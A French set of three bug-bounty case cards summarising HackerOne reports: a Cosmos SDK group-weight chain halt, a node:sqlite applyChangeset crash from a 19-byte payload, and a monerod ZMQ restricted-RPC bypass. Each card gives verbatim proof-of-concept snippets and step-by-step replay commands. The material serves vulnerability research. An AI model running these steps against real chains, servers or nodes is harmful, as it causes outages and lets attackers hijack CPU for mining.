# Fiches SSS — Misc

*3 fiches exploitables issues du corpus 2025-2026 — chaque extrait « Preuve technique » est copié verbatim de la source brute indiquée.*

### Groups module can halt chain when handling a proposal with malicious group weights

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3018307) · bounty : 15 000 $

En étudiant le patch de l'avis GHSA-x5vx-95h7-rv4p (division par zéro quand le total power d'un groupe était nul), le chercheur a trouvé une variante non couverte : `Quo()` échoue aussi lorsque l'exposant du résultat sort de la plage autorisée (`exponent out of range`). Les poids des membres n'étant pas bornés, un groupe avec deux membres à `1e-50000` et `1e50000` amène le vote du membre au poids minuscule à faire échouer `yesCount.Quo(totalPowerDec)`. L'erreur non gérée remonte de `doTallyAndUpdate` (EndBlocker) jusqu'à CometBFT : `CONSENSUS FAILURE` et arrêt complet de la chaîne.

**Cause racine :** le correctif n'a ajouté que la garde `IsZero()` sur la division, alors que `Quo()` peut échouer pour d'autres raisons (exposant hors plage) ; les poids de membres de groupe ne sont pas bornés et l'erreur de `doTallyAndUpdate` n'est pas absorbée dans l'EndBlocker.

**Preuve technique (verbatim depuis la source) :**

```go
if totalPowerDec.IsZero() {
        return DecisionPolicyResult{Allow: false, Final: true}, nil
}
yesPercentage, err := yesCount.Quo(totalPowerDec)
```
```
"weight": "1e-50000"
...
"weight": "1e50000"
```
```
[EXAMPLED] 11:20PM ERR error in proxyAppConn.FinalizeBlock err="doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range" module=state
[EXAMPLED] 11:20PM ERR CONSENSUS FAILURE!!! err="failed to apply block; error doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range [cockroachdb/apd/v2@v2.0.2/condition.go:107]" module=consensus
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : une chaîne Cosmos SDK v0.50.12 avec le module `x/group` (créée via `ignite scaffold chain example`) ; de quoi payer les frais (`--gas auto`) et transférer des fonds à l'adresse de politique.
- Étapes : 1. créer le groupe avec deux membres de poids `1e-50000` et `1e50000` et une `PercentageDecisionPolicy` (`percentage: 0.5`, `voting_period: 10s`, `min_execution_period: 20s`) : `exampled tx group create-group-with-policy cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 "" "" members.json policy.json --gas auto --yes` 2. soumettre la proposition : `exampled tx group submit-proposal proposal.json --gas auto --yes` 3. voter `VOTE_OPTION_YES` avec le membre au poids minuscule : `exampled tx group vote 1 cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 VOTE_OPTION_YES "" --gas auto --yes` 4. à la clôture du vote, `doTallyAndUpdate` échoue et la chaîne s'arrête.
- Pièges / limites : les poids sont des décimaux à exposant (format JSON `"1e-50000"`) ; la chaîne doit effectivement utiliser le module groups ; l'auteur indique qu'un patch est nécessaire côté réseau.

**Reproductibilité :** haute — environnement, fichiers JSON, commandes et résultat attendu entièrement fournis par la source.

**Techniques :** unvalidated group member weights, decimal exponent out of range, unhandled error in endblocker, consensus halt, chain dos

**Correspond aux classes qualifiantes :** dos, logic, chain-halt

**Signal (endpoints/fonctions observés) :**
- `tx group create-group-with-policy` / `submit-proposal` / `vote`
- type `/cosmos.group.v1.PercentageDecisionPolicy`
- `doTallyAndUpdate` appelé depuis l'EndBlocker
- `x/group/types.go` : `yesPercentage, err := yesCount.Quo(totalPowerDec)`

**Paramètres impliqués :** `members[].weight`, `percentage`, `voting_period`, `min_execution_period`, `VOTE_OPTION_YES`

---

### NULL pointer dereference in node:sqlite applyChangeset() via malformed changeset

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3736889)

Un changeset SQLite malformé de 19 octets passé à `DatabaseSync#applyChangeset()` de `node:sqlite` provoque un déréférencement de pointeur nul natif et termine le processus Node.js (`SIGSEGV` / exit 139). Le crash est reproductible sur les binaires officiels Linux x64 v22.22.3, v24.15.0 et v26.1.0, et le `try/catch` JavaScript ne peut pas l'intercepter. Un PoC HTTP de bout en bout est fourni : un service Node lit le corps de la requête comme changeset et appelle `db.applyChangeset(body)` — un simple POST contenant la payload de 19 octets tue le serveur. La cause est en amont d'SQLite (`sqlite3changeset_apply()`, reproduit aussi en standalone sur SQLite 3.53.1), la reachability venant de l'API publique Node.js.

**Cause racine :** `sqlite3changeset_apply()` atteint `sqlite3_value_type(NULL)` via `sessionBindValue()` sur un changeset malformé ; le wrapper Node.js transmet le `Uint8Array` sans validation, produisant un SIGSEGV non rattrapable.

**Preuve technique (verbatim depuis la source) :**

```
54 04 01 00 00 00 74 31 00 17 7e 00 72 28 65 65 28 65 65
```
```js
req.on('end', () => {
  const changeset = Buffer.concat(chunks);
  db.applyChangeset(changeset);
});
```
```
#0  sessionApplyOneOp()
#1  sessionApplyOneWithRetry()
#2  sessionChangesetApply()
#3  sqlite3changeset_apply()
#4  node::sqlite::DatabaseSync::ApplyChangeset(...)
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : Node.js vulnérable (v22.22.3, v24.15.0 ou v26.1.0 sur Linux x64) ; pour l'impact réseau, une application qui passe à `applyChangeset()` un changeset contrôlé par l'attaquant (schéma cible compatible).
- Étapes : 1. extraire `poc/nullpk_19b.changeset` du paquet `Nodejs_PoC.zip` et pointer `NODE_BIN` sur un binaire affecté 2. lancer le service d'exemple : `NODE_BIN=$NODE_BIN ./run_http_server.sh` (écoute sur `http://127.0.0.1:31337/apply`) 3. contrôler que l'endpoint répond avec un POST vide (`received=0`, `HTTP/1.1 200 OK`) 4. envoyer le changeset : `./run_http_client.sh http://127.0.0.1:31337/apply` → `received=19` puis `Segmentation fault (core dumped)`.
- Pièges / limites : versions testées limitées au tableau officiel Linux x64 ; impact disponibilité uniquement (confidentialité/intégrité non démontrées) ; un superviseur (systemd, PM2, Kubernetes) peut redémarrer le service, mais la requête répétée reproduit l'interruption.

**Reproductibilité :** moyenne — payload et étapes complets, mais l'impact exige une application consommatrice qui applique un changeset attaquant (schéma et endpoint spécifiques).

**Techniques :** malformed binary payload, null pointer dereference, native sigsegv dos, trust boundary abuse, process termination

**Correspond aux classes qualifiantes :** dos, memory-corruption, null-pointer-dereference

**Signal (endpoints/fonctions observés) :**
- `DatabaseSync#applyChangeset()` (`node:sqlite`)
- `sqlite3changeset_apply()` / `sessionApplyOneOp()`
- `POST /apply` du service d'exemple (corps binaire passé à `applyChangeset`)
- `poc/nullpk_19b.changeset` (19 octets)

**Paramètres impliqués :** `changeset` (`Uint8Array` / corps de requête), `options`

---

### Restricted RPC Policy Bypass on ZMQ JSON-RPC Allows Unauthenticated Remote Admin Actions

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3601469)

En mode `--restricted-rpc` / `--public-node`, la couche HTTP de monerod masque correctement les méthodes d'administration (`MAP_URI_AUTO_JON2_IF(..., !m_restricted)`), mais la couche ZMQ JSON-RPC n'hérite pas de cet état : `zmq_internals` construit le `DaemonHandler` sans propager la restriction et `daemon_handler.cpp` expose six méthodes sensibles sans gate. Si l'opérateur bind ZMQ hors loopback, un client non authentifié peut invoquer `start_mining` (avec adresse de minage et nombre de threads contrôlés par l'attaquant, jusqu'à `hardware_concurrency() * 4`), `stop_mining`, `save_bc`, `set_log_level`, `mining_status` et `get_peer_list`. Plage affectée indiquée : `v0.12.0.0` → `master` ; le bind ZMQ par défaut est loopback-only.

**Cause racine :** l'état restricted n'est pas propagé au handler ZMQ et la table de dispatch ZMQ expose les méthodes admin inconditionnellement, sans déni restricted entre le parsing et l'exécution du handler (absence de parité avec la politique HTTP).

**Preuve technique (verbatim depuis la source) :**

```cpp
struct zmq_internals
{
  explicit zmq_internals(t_core& core, t_p2p& p2p)
    : rpc_handler{core.get(), p2p.get()}
    , server{rpc_handler}
  {}
};
```
```cpp
  {u8"start_mining", handle_message<StartMining>},
  {u8"stop_mining", handle_message<StopMining>}
```
```python
call("set_log_level", {"level": 4})
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : monerod vulnérable lancé avec `--restricted-rpc` ET un bind ZMQ hors loopback (`--zmq-rpc-bind-ip 0.0.0.0 --zmq-rpc-bind-port 18082`) ; client ZMQ (`python3 -m pip install pyzmq`).
- Étapes : 1. démarrer le daemon (mode offline possible) avec les options ci-dessus 2. se connecter au socket `tcp://TARGET_IP:18082` en REQ 3. envoyer `set_log_level` (`level: 4`) avec `rpc_version` 131072 → la réponse vulnérable est `"status": "OK"` malgré le mode restreint 4. invoquer `start_mining` (`miner_address`, `threads_count`) pour détourner le CPU.
- Pièges / limites : le bind ZMQ par défaut est loopback-only — l'exposition hors loopback est requise et ne bénéficie pas du garde-fou HTTP `--confirm-external-bind` ; `start_mining` exige une adresse valide pour le nettype du daemon ; validation faite en local, pas contre une infrastructure Monero publique.

**Reproductibilité :** moyenne — PoC complet fourni, mais exploitation conditionnée à une configuration non par défaut (bind ZMQ externe).

**Techniques :** restricted mode bypass, rpc access-control parity, zmq json-rpc, unauthenticated admin method, resource theft via mining

**Correspond aux classes qualifiantes :** auth-bypass, bfla, dos

**Signal (endpoints/fonctions observés) :**
- socket ZMQ JSON-RPC `tcp://<ip>:18082` (`--zmq-rpc-bind-ip` / `--zmq-rpc-bind-port`)
- méthodes `start_mining`, `stop_mining`, `save_bc`, `set_log_level`, `mining_status`, `get_peer_list`
- HTTP : `MAP_URI_AUTO_JON2_IF(..., !m_restricted)` (protection absente côté ZMQ)
- `src/daemon/daemon.cpp` (`zmq_internals`), `src/rpc/daemon_handler.cpp` (table de handlers)

**Paramètres impliqués :** `method`, `params.rpc_version`, `params.level`, `params.miner_address`, `params.threads_count`
